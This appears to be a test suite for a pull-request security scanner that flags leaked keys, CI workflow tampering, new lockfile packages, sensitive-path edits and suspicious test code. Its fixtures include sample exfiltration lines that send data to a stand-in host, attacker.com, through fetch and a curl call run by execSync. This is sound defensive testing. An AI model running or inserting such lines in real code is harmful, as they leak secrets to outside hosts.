import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  findExistingDraftAdvisory,
  scanSecrets,
  scanCITampering,
  scanBuildScripts,
  scanSupplyChain,
  scanTestPatterns,
  scanSensitivePaths,
} from '../check-pr-security.mjs';

// ── scanSecrets ──────────────────────────────────────────────────────────────

test('scanSecrets: flags OpenAI key in added line', () => {
  const files = [{ filename: 'src/config.ts', patch: '+const key = "sk-abcdefghijklmnopqrstuvwxyz123456"' }];
  assert.ok(scanSecrets(files).length > 0);
});

test('scanSecrets: flags AWS key in added line', () => {
  const files = [{ filename: 'src/config.ts', patch: '+const awsKey = "AKIAIOSFODNN7EXAMPLE"' }];
  assert.ok(scanSecrets(files).length > 0);
});

test('scanSecrets: ignores removed lines', () => {
  const files = [{ filename: 'src/config.ts', patch: '-const key = "sk-abcdefghijklmnopqrstuvwxyz123456"' }];
  assert.equal(scanSecrets(files).length, 0);
});

test('scanSecrets: ignores files without patch', () => {
  assert.equal(scanSecrets([{ filename: 'large-file.ts' }]).length, 0);
});

// ── scanCITampering ──────────────────────────────────────────────────────────

test('scanCITampering: flags workflow file changes', () => {
  const files = [{ filename: '.github/workflows/pr.yml', status: 'modified' }];
  assert.ok(scanCITampering(files).length > 0);
});

test('scanCITampering: ignores non-workflow files', () => {
  const files = [{ filename: 'src/foo.ts', status: 'modified' }];
  assert.equal(scanCITampering(files).length, 0);
});

test('scanCITampering: ignores removed workflow files', () => {
  const files = [{ filename: '.github/workflows/old.yml', status: 'removed' }];
  assert.equal(scanCITampering(files).length, 0);
});

// ── scanBuildScripts ─────────────────────────────────────────────────────────

test('scanBuildScripts: flags changes to release.sh', () => {
  const files = [{ filename: 'scripts/release.sh', status: 'modified' }];
  assert.ok(scanBuildScripts(files).length > 0);
});

test('scanBuildScripts: ignores non-CI scripts', () => {
  const files = [{ filename: 'scripts/generate-org-chart-images.ts', status: 'modified' }];
  assert.equal(scanBuildScripts(files).length, 0);
});

// ── scanSupplyChain ──────────────────────────────────────────────────────────

test('scanSupplyChain: flags net-new packages in lockfile', () => {
  const patch = `@@ -1,3 +1,4 @@
 packages:
+  'evil-package@1.0.0':
   'existing-package@2.0.0':
-  'old-package@1.0.0':
`;
  const files = [{ filename: 'pnpm-lock.yaml', patch }];
  const flags = scanSupplyChain(files);
  assert.ok(flags.length > 0);
  assert.ok(flags[0].packages.includes('evil-package'));
});

test('scanSupplyChain: does not flag version-only bumps', () => {
  const patch = `@@ -1,3 +1,3 @@
 packages:
-  'existing-package@1.0.0':
+  'existing-package@2.0.0':
`;
  const files = [{ filename: 'pnpm-lock.yaml', patch }];
  assert.equal(scanSupplyChain(files).length, 0);
});

test('scanSupplyChain: flags pnpm v9-style unquoted package entries', () => {
  const patch = `@@ -1,2 +1,3 @@
+evil-package@1.0.0:
 existing-package@2.0.0:
`;
  const files = [{ filename: 'pnpm-lock.yaml', patch }];
  const flags = scanSupplyChain(files);
  assert.deepEqual(flags, [{ check: 'supply-chain', packages: ['evil-package'] }]);
});

test('scanSupplyChain: ignores peer suffixes when matching package names', () => {
  const patch = `@@ -1,2 +1,2 @@
-@scope/pkg@1.0.0(react@18.2.0):
+@scope/pkg@2.0.0(react@18.2.0):
`;
  const files = [{ filename: 'pnpm-lock.yaml', patch }];
  assert.equal(scanSupplyChain(files).length, 0);
});

test('findExistingDraftAdvisory: returns matching draft advisory from paginated results', async () => {
  const calls = [];
  const fakeFetch = async (path) => {
    calls.push(path);
    if (/[?&]page=1(?:&|$)/.test(path)) {
      return Array.from({ length: 100 }, (_, i) => ({ summary: `Unrelated advisory ${i}` }));
    }
    if (/[?&]page=2(?:&|$)/.test(path)) {
      return [{ summary: '🚨 Security flag — PR #6469: ci-tampering' }];
    }
    return [];
  };

  const advisory = await findExistingDraftAdvisory(fakeFetch, 'token', 'paperclipai/paperclip', 6469);

  assert.deepEqual(advisory, { summary: '🚨 Security flag — PR #6469: ci-tampering' });
  assert.equal(calls.length, 2);
});

test('findExistingDraftAdvisory: returns null when no matching draft advisory exists', async () => {
  const fakeFetch = async () => [{ summary: 'Completely different advisory' }];
  const advisory = await findExistingDraftAdvisory(fakeFetch, 'token', 'paperclipai/paperclip', 6469);
  assert.equal(advisory, null);
});

// ── scanTestPatterns ─────────────────────────────────────────────────────────

test('scanTestPatterns: flags outbound fetch in test file', () => {
  const files = [{
    filename: 'src/foo.test.ts',
    patch: `+  const res = await fetch('https://attacker.com/collect')`,
  }];
  assert.ok(scanTestPatterns(files).length > 0);
});

test('scanTestPatterns: flags execSync in test file', () => {
  const files = [{
    filename: 'src/foo.test.ts',
    patch: `+  execSync('curl https://attacker.com?data=' + secret)`,
  }];
  assert.ok(scanTestPatterns(files).length > 0);
});

test('scanTestPatterns: ignores suspicious patterns in non-test files', () => {
  const files = [{
    filename: 'src/api.ts',
    patch: `+  const res = await fetch('https://api.example.com')`,
  }];
  assert.equal(scanTestPatterns(files).length, 0);
});

// ── scanSensitivePaths ───────────────────────────────────────────────────────

test('scanSensitivePaths: flags changes to agents route (API key IDOR / cross-tenant)', () => {
  const files = [{ filename: 'server/src/routes/agents.ts', status: 'modified' }];
  assert.ok(scanSensitivePaths(files).length > 0);
});

test('scanSensitivePaths: flags changes to MarkdownBody (XSS via urlTransform)', () => {
  const files = [{ filename: 'ui/src/components/MarkdownBody.tsx', status: 'modified' }];
  assert.ok(scanSensitivePaths(files).length > 0);
});

test('scanSensitivePaths: flags changes to company-skills route (malicious skill exfil)', () => {
  const files = [{ filename: 'server/src/routes/company-skills.ts', status: 'modified' }];
  assert.ok(scanSensitivePaths(files).length > 0);
});

test('scanSensitivePaths: ignores unrelated paths', () => {
  const files = [{ filename: 'server/src/utils/date.ts', status: 'modified' }];
  assert.equal(scanSensitivePaths(files).length, 0);
});

test('scanSensitivePaths: ignores removed files even on sensitive paths', () => {
  const files = [{ filename: 'server/src/routes/agents.ts', status: 'removed' }];
  assert.equal(scanSensitivePaths(files).length, 0);
});
